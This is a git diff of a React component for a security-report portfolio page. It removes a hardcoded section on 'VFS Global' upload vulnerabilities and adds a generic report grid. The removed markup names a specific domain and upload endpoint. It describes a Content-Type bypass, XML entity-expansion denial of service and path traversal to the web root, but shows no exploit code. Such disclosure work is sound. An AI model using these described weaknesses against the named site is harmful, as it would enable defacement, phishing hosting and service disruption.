-              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M6.002 5.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"/><path d="M2.002 1a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2h-12zm12 1a1 1 0 0 1 1 1v6.5l-3.777-1.947a.5.5 0 0 0-.577.093l-3.71 3.71-2.66-1.772a.5.5 0 0 0-.63.062L1.002 12V3a1 1 0 0 1 1-1h12z"/></svg>
-              Email Screenshots
-            </h2>
-            <ScreenshotGallery screenshots={headwayScreenshots} onOpen={setLightboxImg} />
-          </div>
-        </div>
-      )}
-
-      {/* ==================== VFS GLOBAL REPORT ==================== */}
-      {activeReport === 'vfsglobal' && (
-        <div className="sec-report-wrapper">
-          <div className="sec-report-card sec-animate">
-            <div className="sec-report-header">
-              <div className="sec-report-title-row">
-                <h2>VFS Global — Multiple Critical Upload Vulnerabilities</h2>
-                <span className="severity-badge critical">CRITICAL</span>
-              </div>
-              <div className="sec-report-meta">
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Target</span>
-                  <span className="sec-meta-value code-text">vfsglobalcustomerexperience.com</span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Vulnerable Endpoint</span>
-                  <span className="sec-meta-value code-text">/CustomerFeedback/GeneralFeedback/UploadFiles/</span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Vulnerabilities Found</span>
-                  <span className="sec-meta-value">3 distinct vulnerabilities in the file upload functionality</span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Platform</span>
-                  <span className="sec-meta-value">ASP.NET Core on IIS (Windows Server)</span>
-                </div>
-              </div>
+          {/* Report grid */}
+          {visibleReports.length > 0 ? (
+            <div className="sec-grid sec-animate">
+              {visibleReports.map((report) => (
+                <ReportCard key={report.id} report={report} onOpen={openReport} />
+              ))}
             </div>
-          </div>
-
-          {/* Individual vulnerabilities */}
-          <div className="vfs-vulns sec-animate">
-            {vfsVulnerabilities.map((vuln, i) => (
-              <div className="vfs-vuln-card" key={i}>
-                <div className="vfs-vuln-header">
-                  <span className="vfs-vuln-num">0{i + 1}</span>
-                  <div>
-                    <h3>{vuln.title}</h3>
-                    <span className={`severity-badge ${vuln.severity.toLowerCase()}`}>{vuln.severity}</span>
-                  </div>
-                </div>
-                <p className="vfs-vuln-desc">{vuln.desc}</p>
-                <div className="vfs-vuln-details">
-                  <div className="vfs-detail">
-                    <span className="vfs-detail-label">Endpoint</span>
-                    <span className="code-text">{vuln.endpoint}</span>
-                  </div>
-                  <div className="vfs-detail">
-                    <span className="vfs-detail-label">Proof</span>
-                    <span className="sec-meta-value">{vuln.proof}</span>
-                  </div>
-                </div>
-                {vuln.code && (
-                  <div className="vfs-code-section">
-                    <button className="vfs-code-toggle" onClick={() => setExpandedCode(expandedCode === i ? null : i)}>
-                      <span>{expandedCode === i ? '⟨/⟩ Hide' : '⟨/⟩ View'} Exploit Code</span>
-                      <svg className={`sec-chevron ${expandedCode === i ? 'rotated' : ''}`} width="16" height="16" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
-                    </button>
-                    {expandedCode === i && (
-                      <div className="vfs-code-block">
-                        <pre><code>{vuln.code}</code></pre>
-                      </div>
-                    )}
-                  </div>
-                )}
-              </div>
-            ))}
-          </div>
-
-          {/* Impact summary for VFS */}
-          <div className="sec-report-card sec-animate" style={{marginTop: '1.5rem'}}>
-            <div className="sec-panels">
-              <div className={`sec-panel ${expandedPanel === 'vfs-impact' ? 'expanded' : ''}`}>
-                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'vfs-impact' ? '' : 'vfs-impact')}>
-                  <span>💥 Combined Impact</span>
-                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
-                </button>
-                {expandedPanel === 'vfs-impact' && (
-                  <div className="sec-panel-content">
-                    <div className="impact-grid">
-                      <div className="impact-item"><div className="impact-icon">📄</div><h4>Arbitrary File Upload</h4><p>Attacker can upload malicious HTML/JS files to the server by bypassing Content-Type validation, hosting phishing pages on the trusted domain.</p></div>
-                      <div className="impact-item"><div className="impact-icon">💣</div><h4>Denial of Service</h4><p>XML Billion Laughs payload causes exponential memory consumption, potentially crashing the server or degrading service for all users.</p></div>
-                      <div className="impact-item"><div className="impact-icon">🗂️</div><h4>Web Root Write Access</h4><p>Path traversal allows writing files to the IIS web root, enabling site defacement, persistent XSS, or malware hosting under a trusted domain.</p></div>
-                    </div>
-                  </div>
-                )}
-              </div>
-            </div>
-          </div>
-
-          {/* VFS Video */}
-          <div className="sec-evidence sec-animate">
-            <h2 className="sec-evidence-title">
-              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 12V4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm6.79-6.907A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l3.5-2.5a.5.5 0 0 0 0-.814l-3.5-2.5z"/></svg>
-              Proof of Concept Video
-            </h2>
-            <VideoBlock badge="Vulnerability Demonstration" badgeClass="reported" title="VFS Global — Upload Vulnerabilities PoC" description={<>Demonstration of the Content-Type bypass, XML entity expansion, and path traversal vulnerabilities on <span className="code-text">vfsglobalcustomerexperience.com</span>.</>} videoSrc="/vfsglobal.mp4" />
-          </div>
-        </div>
+          ) : (
+            <p className="sec-empty sec-animate">No reports match your search.</p>
+          )}
+        </>
+      ) : (
+        <ReportDetail report={activeReport} onBack={backToGrid} onOpenImage={setLightboxImg} />
       )}
 
       {/* Lightbox */}
@@ -475,7 +526,7 @@ function Security() {
         <div className="sec-lightbox" onClick={() => setLightboxImg(null)}>
           <div className="sec-lightbox-content" onClick={(e) => e.stopPropagation()}>
             <button className="sec-lightbox-close" onClick={() => setLightboxImg(null)}>✕</button>
-            <img src={lightboxImg} alt="Email screenshot" />
+            <img src={lightboxImg} alt="Screenshot" />
           </div>
         </div>
       )}
